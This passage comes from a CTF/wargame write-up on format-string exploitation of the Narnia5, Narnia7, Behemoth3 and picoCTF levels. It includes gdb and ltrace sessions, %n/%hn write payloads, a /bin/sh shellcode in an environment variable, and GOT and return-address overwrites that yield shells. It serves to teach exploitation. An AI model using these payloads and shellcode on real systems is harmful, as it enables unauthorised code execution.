</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buffer : [%s] (%d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>  <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;i = %d (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
Let&#8217;s try to see what&#8217;s on stack and if we can put something on stack and change the value of i.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia5@melinda:~$ /narnia/narnia5 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x 
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.62653766.36656436.6666662e.] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [AAAAf7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.41414141.62653766.36656] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.ffffd6cc.62653766.36656] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08n.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8..62653766.36656436.6666] (63)
</span><span class='line'>i = 40 (0xffffd6cc)
</span><span class='line'>
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%468x.%08n.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. GOOD
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
</li>

<li>In this example, let&#8217;s see use of arbitary writing an address <strong>Narnia7</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">();</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">vuln</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">){</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ptrf</span><span class="p">)();</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;goodfunction() = %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">goodfunction</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hackedfunction() = %p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">hackedfunction</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;before : ptrf() = %p (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ptrf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptrf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess you want to come to the hackedfunction...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'>        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="n">ptrf</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">){</span>
</span><span class='line'>                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Usage: %s &lt;buffer&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">(){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome to the goodfunction, but i said the Hackedfunction..</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">(){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Way to go!!!!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
If we see, the program provides us with the address of the ptrf pointer, goodfunction and bad function. The ptrf is assigned the address of goodfunction if we somehow change it to address of the badfunction, we can get a shell. Let&#8217;s run the program and see what are the address we get.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./narnia71 A
</span><span class='line'>goodfunction() = 0x804871f
</span><span class='line'>hackedfunction() = 0x8048745
</span><span class='line'>
</span><span class='line'>before : ptrf() = 0x804871f (0xffb4450c)
</span><span class='line'>I guess you want to come to the hackedfunction...
</span><span class='line'>Welcome to the goodfunction, but i said the Hackedfunction..</span></code></pre></td></tr></table></div></figure>
and
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia7@melinda:/narnia$ ./narnia7 A
</span><span class='line'>goodfunction() = 0x80486e0
</span><span class='line'>hackedfunction() = 0x8048706
</span><span class='line'>
</span><span class='line'>before : ptrf() = 0x80486e0 (0xffffd64c)
</span><span class='line'>I guess you want to come to the hackedfunction...
</span><span class='line'>Welcome to the goodfunction, but i said the Hackedfunction..</span></code></pre></td></tr></table></div></figure>
The reason I have added two running instances is because in the first instance the address is different by one byte 0x1f and 0x45 where as in the second instance the address differs by two bytes 0x86e0 and 0x8706. We can write two bytes by %hn and one byte by %hhn. We can write whole 4 byte address by following a formula 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>If HOB &lt; LOB
</span><span class='line'>
</span><span class='line'>HOB:0x0804
</span><span class='line'>LOB:0x8706
</span><span class='line'>
</span><span class='line'>[addr+2][addr] = \x4e\xd6\xff\xff\x4c\xd6\xff\xff
</span><span class='line'>%.[HOB - 8]x   = 0x804 - 8 = 7FC (2044) = %.2044x
</span><span class='line'>%[offset]$hn   = %6\$hn
</span><span class='line'>%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
</span><span class='line'>%[offset+1]$hn = %7\$hn
</span><span class='line'>
</span><span class='line'>`python -c 'print "\x4e\xd6\xff\xff\x4c\xd6\xff\xff" +"%.2044x%6\$hn %.32514x%7\$hn"'`</span></code></pre></td></tr></table></div></figure>

We also need to find the offset where the address is stored which can be done by two methods: Either compiling the program on local machine and checking the buffer just after snprintf
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ p buffer 
</span><span class='line'>$2 = "AAAA.000008a2.f7fdeb58.f7fde860.0804835c.0804871f.41414141.3030302e.61383030", '\000' &lt;repeats 51 times&gt;
</span></code></pre></td></tr></table></div></figure>
or by using ltrace 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia7@melinda:/narnia$ ltrace ./narnia7 `python -c 'print "AAAA" + ".%08x"*7'`
</span><span class='line'>__libc_start_main(0x804868f, 2, 0xffffd764, 0x8048740 &lt;unfinished ...&gt;
</span><span class='line'>memset(0xffffd620, '\0', 128)                                                                                          = 0xffffd620
</span><span class='line'>printf("goodfunction() = %p\n", 0x80486e0goodfunction() = 0x80486e0
</span><span class='line'>)                                                                             = 27
</span><span class='line'>
</span><span class='line'>)                                                                         = 30
</span><span class='line'>printf("before : ptrf() = %p (%p)\n", 0x80486e0, 0xffffd61cbefore : ptrf() = 0x80486e0 (0xffffd61c)
</span><span class='line'>)                                                           = 41
</span><span class='line'>puts("I guess you want to come to the "...I guess you want to come to the hackedfunction...
</span><span class='line'>printf("hackedfunction() = %p\n\n", 0x8048706hackedfunction() = 0x8048706
</span><span class='line'>)                                                                            = 50
</span><span class='line'>sleep(2)                                                                                                               = 0
</span><span class='line'>snprintf("AAAA.08048238.ffffd678.f7ffda94."..., 128, "AAAA.%08x.%08x.%08x.%08x.%08x.%0"..., 0x8048238, 0xffffd678, 0xf7ffda94, 0, 0x80486e0, 0x41414141, 0x3038302e) = 67
</span><span class='line'>puts("Welcome to the goodfunction, but"...Welcome to the goodfunction, but i said the Hackedfunction..
</span><span class='line'>)                                                                            = 61
</span><span class='line'>fflush(0xf7fcaac0)                                                                                                     = 0
</span><span class='line'>exit(0 &lt;no return ...&gt;
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
If you see 0x41414141 is at offset 6.

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ p ptrf
</span><span class='line'>$3 = (int (*)()) 0x804871f &lt;goodfunction&gt;
</span><span class='line'>gdb-peda$ p &ptrf
</span><span class='line'>$4 = (int (**)()) 0xffffd2ec
</span><span class='line'>gdb-peda$ x /10xb 0xfffd3ea
</span><span class='line'>0xfffd3ea:    Cannot access memory at address 0xfffd3ea
</span><span class='line'>gdb-peda$ x /10xb 0xffffd3ea
</span><span class='line'>0xffffd3ea:   0x3f    0x77    0x00    0x00    0x00    0x00    0x00    0x00
</span><span class='line'>0xffffd3f2:   0x00    0x00
</span><span class='line'>gdb-peda$ x /10xb 0xffffd2ea
</span><span class='line'>0xffffd2ea:   0x04    0x08    0x1f    0x87    0x04    0x08    0x41    0x41
</span><span class='line'>0xffffd2f2:   0x41    0x41
</span><span class='line'>gdb-peda$ p goodfunction 
</span><span class='line'>$5 = {int ()} 0x804871f &lt;goodfunction&gt;
</span><span class='line'>gdb-peda$ p ha
</span><span class='line'>hackedfunction  hasmntopt       
</span><span class='line'>gdb-peda$ p hackedfunction 
</span><span class='line'>$6 = {int ()} 0x8048745 &lt;hackedfunction&gt;</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ p &ptrf 
</span><span class='line'>$10 = (int (**)()) 0xffffd2fc
</span><span class='line'>gdb-peda$ run `python -c 'print "\xfc\xd2\xff\xff" + ".%08x"*5 + "%hhn"'`
</span><span class='line'>gdb-peda$ p ptrf 
</span><span class='line'>$12 = (int (*)()) 0x8048731 &lt;goodfunction+18&gt;
</span><span class='line'>gdb-peda$ x /10xb 0xffffd2fa
</span><span class='line'>0xffffd2fa:   0x04    0x08    0x31    0x87    0x04    0x08    0xfc    0xd2
</span><span class='line'>0xffffd302:   0xff    0xff
</span></code></pre></td></tr></table></div></figure>

</li>

<li>Let&#8217;s see another example <strong>Behemoth3</strong> where we have only the assembly code of the program and we exploit this by two methods by overwriting the GOT address or overwriting the return address.

Assembly Source Code:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) disassemble main 
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x0804847d &lt;+0&gt;: push   %ebp
</span><span class='line'>   0x0804847e &lt;+1&gt;: mov    %esp,%ebp
</span><span class='line'>   0x08048480 &lt;+3&gt;: and    $0xfffffff0,%esp
</span><span class='line'>   0x08048483 &lt;+6&gt;: sub    $0xe0,%esp
</span><span class='line'>   0x08048489 &lt;+12&gt;:    movl   $0x8048570,(%esp)
</span><span class='line'>   0x08048490 &lt;+19&gt;:    call   0x8048330 &lt;printf@plt&gt;
</span><span class='line'>   0x08048495 &lt;+24&gt;:    mov    0x80497a4,%eax
</span><span class='line'>   0x0804849a &lt;+29&gt;:    mov    %eax,0x8(%esp)
</span><span class='line'>   0x0804849e &lt;+33&gt;:    movl   $0xc8,0x4(%esp)
</span><span class='line'>   0x080484a6 &lt;+41&gt;:    lea    0x18(%esp),%eax
</span><span class='line'>   0x080484aa &lt;+45&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x080484ad &lt;+48&gt;:    call   0x8048340 &lt;fgets@plt&gt;
</span><span class='line'>   0x080484b2 &lt;+53&gt;:    movl   $0x8048584,(%esp)
</span><span class='line'>   0x080484b9 &lt;+60&gt;:    call   0x8048330 &lt;printf@plt&gt;
</span><span class='line'>   0x080484be &lt;+65&gt;:    lea    0x18(%esp),%eax
</span><span class='line'>   0x080484c2 &lt;+69&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x080484c5 &lt;+72&gt;:    call   0x8048330 &lt;printf@plt&gt;
</span><span class='line'>   0x080484ca &lt;+77&gt;:    movl   $0x804858e,(%esp)
</span><span class='line'>   0x080484d1 &lt;+84&gt;:    call   0x8048350 &lt;puts@plt&gt;
</span><span class='line'>   0x080484d6 &lt;+89&gt;:    mov    $0x0,%eax
</span><span class='line'>   0x080484db &lt;+94&gt;:    leave  
</span><span class='line'>   0x080484dc &lt;+95&gt;:    ret    
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>

Observed Behavior:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth3@melinda:/tmp/rahul3$ ./behemoth3 
</span><span class='line'>Identify yourself: HelloCheck123
</span><span class='line'>Welcome, HelloCheck123
</span><span class='line'>
</span><span class='line'>aaaand goodbye again.</span></code></pre></td></tr></table></div></figure>
Well, we tried to provide a very large input to the Identify yourself, but it didn&#8217;t not gave a segmentation fault. Let&#8217;s try format string:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth3@melinda:/tmp/rahul3$ echo `python -c 'print "A"*4 + ".%08x"*7'` | ./behemoth3 
</span><span class='line'>Identify yourself: Welcome, AAAA.000000c8.f7fcac20.00000000.00000000.f7ffd000.41414141.3830252e
</span><span class='line'>
</span><span class='line'>aaaand goodbye again.</span></code></pre></td></tr></table></div></figure>
Trying simple format string provided us with the offset of our format string. Now we can write almost any address with any value with our input. Before that let&#8217;s put a environment variable shellcode and check it&#8217;s address:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export EGG=`python -c 'print "\x90"*90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`</span></code></pre></td></tr></table></div></figure>
Let&#8217;s core dump the binary using %s and examine the core. Our shellcode can be reached at 0xffffd8f0

<ul>
Either we can 
<li>overwrite the return address (main+95): Let&#8217;s debug the program set the breakpoint at main+95 and see the value of $esp which would be use to find the return address when binary is executed without gdb. The value is 0xf7e3ba63 and the return address which needed to be overwrriten is 0xffffd65c. Let&#8217;s again core dump the binary to see the return address without gdb.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) find $esp,+2000,0xf7e3ba63
</span><span class='line'>0xffffd66c
</span><span class='line'>1 pattern found.</span></code></pre></td></tr></table></div></figure>
So, if we overwrite the return address at 0xffffd66c with our shellcode value of 0xffffd8f0, we should get a shell.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> python -c 'print "\x5e\xd6\xff\xff\x5c\xd6\xff\xff" +"%.65527x%6$hn %.55503x%7$hn"' &gt; input98</span></code></pre></td></tr></table></div></figure>
This is little tricky because we might have to guess the return address without gdb. Previously it was coming 0xffffd66c but we got shell using 0xffffd65c.
 </li>
<li>overwrite the puts GOT address:
Find the GOT address of puts which is 0x08049790 and overwrite it with 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'print "\x92\x97\x04\x08\x90\x97\x04\x08" +"%.65527x%6$hn %.55503x%7$hn"'</span></code></pre></td></tr></table></div></figure></li>
</ul>
</li>

<li>
In the below code, if we can somehow set the value of secret to 1337, we can get a shell on the system to read the flag. Also, the printf function directly prints the argument whatever is passed by the user. By concepts above, we need to find the address of secret and write to it. Address of the secret can be found by gdb or objdump. Either the address would be already present on stack or it can be put on stack.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">secret</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">){</span>
</span><span class='line'>        <span class="n">give_shell</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

Reading the address
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ gdb -q format
</span><span class='line'>Reading symbols from format...(no debugging symbols found)...done.
</span><span class='line'>(gdb) p $secret
</span><span class='line'>$1 = void
</span><span class='line'>(gdb) p &secret
</span><span class='line'>$2 = (&lt;data variable, no debug info&gt; *) 0x804a030 &lt;secret&gt;</span></code></pre></td></tr></table></div></figure>
Now we have to find whether is this address present on the stack? If not, we can put this address on the stack because of the format string vulnerability.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ ./format %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
